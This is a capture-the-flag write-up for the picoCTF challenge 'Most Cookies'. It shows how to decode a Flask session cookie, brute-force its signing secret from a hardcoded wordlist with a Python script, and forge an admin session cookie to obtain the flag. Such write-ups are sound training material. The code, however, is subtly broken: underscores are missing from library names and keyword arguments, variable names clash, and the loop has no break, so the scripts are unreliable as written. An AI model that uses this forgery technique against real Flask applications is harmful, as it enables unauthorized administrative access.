
description: 'Flask client-side sessions, cookie forgery'
Most Cookies (150)
Problem
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py
{% embed url="http://mercury.picoctf.net:18835" %}
Solution
From the source code, things to note:
1) The /display page checks the session cookie. We need to change the very_auth session variable to admin somehow.

2) The Flask session secret key is hardcoded into the source code!
python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

We can decode the Flask session cookie like this:
1) Take the part before the period (.)

2) Append the == padding
3) Base64 decode:
```python



base64.urlsafeb64decode('eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0==')
      b'{"veryauth":"snickerdoodle"}'
      ```



So we can change the session variable to admin and encode it again, but first, we need to crack the secret key. This is because the remainder of the session cookie is the signature which will be checked at the server-side to prevent tampering.
The following script will bruteforce each secret in the wordlist:
```python
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
wordlist = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
cookiestr="eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YF7u-Q.G5B5RUmEVaXNyLzjitMwzPxALp4"
def decodeflaskcookie(secretkey, cookiestr):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signerkwargs = {
        'keyderivation': 'hmac',
        'digestmethod': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secretkey, serializer=serializer, salt=salt, signerkwargs = signerkwargs)
    return s.loads(cookiestr)
for secretkey in wordlist:
    try:
        cookie = decodeflaskcookie(secretkey, cookie_str)
    except:
        continue
print(secret_key)
print(cookie)

```
Here, the secret key is 'butter'.

With the secret key, we can craft our own session cookie:
```python
import hashlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import TaggedJSONSerializer
session = {'very_auth': 'admin'}
secret = 'butter'
print(URLSafeTimedSerializer(
    secretkey = secret,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signerkwargs={
        'keyderivation': 'hmac',
        'digestmethod': hashlib.sha1
    }
).dumps(session))
```

Putting this new crafted cookie back into Burpsuite, we get the flag in the response.

